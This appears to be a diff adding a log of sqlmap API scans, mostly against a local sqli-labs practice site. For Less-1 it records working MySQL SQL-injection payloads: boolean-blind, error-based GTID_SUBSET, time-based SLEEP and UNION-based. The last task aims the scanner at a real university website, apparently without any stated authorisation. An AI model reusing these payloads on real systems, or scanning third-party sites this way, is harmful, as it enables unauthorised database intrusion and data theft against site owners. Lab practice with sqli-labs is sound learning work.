@@ -1,0 +1,145 @@
+=========== python sqlmapapi task 5a1d4d656e9bb2aa start ===========
+
+target: http://127.0.0.1/sqli-labs/Less-1?id=1
+{
+    "success": true,
+    "data": [
+        {
+            "status": 1,
+            "type": 0,
+            "value": {
+                "url": "http://127.0.0.1/sqli-labs/Less-1",
+                "query": "id=1",
+                "data": null
+            }
+        },
+        {
+            "status": 1,
+            "type": 1,
+            "value": [
+                {
+                    "place": "GET",
+                    "parameter": "id",
+                    "ptype": 2,
+                    "prefix": "'",
+                    "suffix": " AND '[RANDSTR]'='[RANDSTR]",
+                    "clause": [
+                        1,
+                        8,
+                        9
+                    ],
+                    "notes": [],
+                    "data": {
+                        "1": {
+                            "title": "AND boolean-based blind - WHERE or HAVING clause",
+                            "payload": "id=1' AND 6316=6316 AND 'GLBh'='GLBh",
+                            "where": 1,
+                            "vector": "AND [INFERENCE]",
+                            "comment": "",
+                            "templatePayload": null,
+                            "matchRatio": 0.957,
+                            "trueCode": 200,
+                            "falseCode": 200
+                        },
+                        "2": {
+                            "title": "MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)",
+                            "payload": "id=1' AND GTID_SUBSET(CONCAT(0x7162627671,(SELECT (ELT(1506=1506,1))),0x7178627a71),1506) AND 'AFap'='AFap",
+                            "where": 1,
+                            "vector": "AND GTID_SUBSET(CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]'),[RANDNUM])",
+                            "comment": "",
+                            "templatePayload": null,
+                            "matchRatio": 0.957,
+                            "trueCode": null,
+                            "falseCode": null
+                        },
+                        "5": {
+                            "title": "MySQL >= 5.0.12 AND time-based blind (query SLEEP)",
+                            "payload": "id=1' AND (SELECT 5650 FROM (SELECT(SLEEP([SLEEPTIME])))TbYC) AND 'oHGz'='oHGz",
+                            "where": 1,
+                            "vector": "AND (SELECT [RANDNUM] FROM (SELECT(SLEEP([SLEEPTIME]-(IF([INFERENCE],0,[SLEEPTIME])))))[RANDSTR])",
+                            "comment": "",
+                            "templatePayload": null,
+                            "matchRatio": 0.957,
+                            "trueCode": 200,
+                            "falseCode": null
+                        },
+                        "6": {
+                            "title": "Generic UNION query (NULL) - 1 to 20 columns",
+                            "payload": "id=-2609' UNION ALL SELECT NULL,NULL,CONCAT(0x7162627671,0x6f5156534f4c6a475269484e76484c557462507772444a465059466861696c4e704a4d766541456e,0x7178627a71)-- -",
+                            "where": 2,
+                            "vector": [
+                                2,
+                                3,
+                                "[GENERIC_SQL_COMMENT]",
+                                "'",
+                                " AND '[RANDSTR]'='[RANDSTR]",
+                                "NULL",
+                                2,
+                                false,
+                                null,
+                                null,
+                                null
+                            ],
+                            "comment": "[GENERIC_SQL_COMMENT]",
+                            "templatePayload": null,
+                            "matchRatio": 0.957,
+                            "trueCode": null,
+                            "falseCode": null
+                        }
+                    },
+                    "conf": {
+                        "textOnly": null,
+                        "titles": null,
+                        "code": null,
+                        "string": "Your",
+                        "notString": null,
+                        "regexp": null,
+                        "optimize": null
+                    },
+                    "dbms": "MySQL",
+                    "dbms_version": [
+                        ">= 5.6"
+                    ],
+                    "os": null
+                }
+            ]
+        }
+    ],
+    "error": []
+}
+
+=========== python sqlmapapi task 5a1d4d656e9bb2aa end ===========
+
+=========== python sqlmapapi task 5d582121afab06f9 start ===========
+
+target: http://127.0.0.1/sqli-labs/Less-2
+{
+    "success": true,
+    "data": [],
+    "error": []
+}
+
+=========== python sqlmapapi task 5d582121afab06f9 end ===========
+
+=========== python sqlmapapi task 5d02aa814b74188d start ===========
+
+target: http://127.0.0.1/sqli-labs/Less-3
+{
+    "success": true,
+    "data": [],
+    "error": []
+}
+
+=========== python sqlmapapi task 5d02aa814b74188d end ===========
+
+=========== python sqlmapapi task daaf538e4f2c74fa start ===========
+
+target: https://www.sdxiehe.edu.cn/rsc/view.php?id=73341
+{
+    "success": true,
+    "data": [],
+    "error": []
+}
+
+=========== python sqlmapapi task daaf538e4f2c74fa end ===========
+
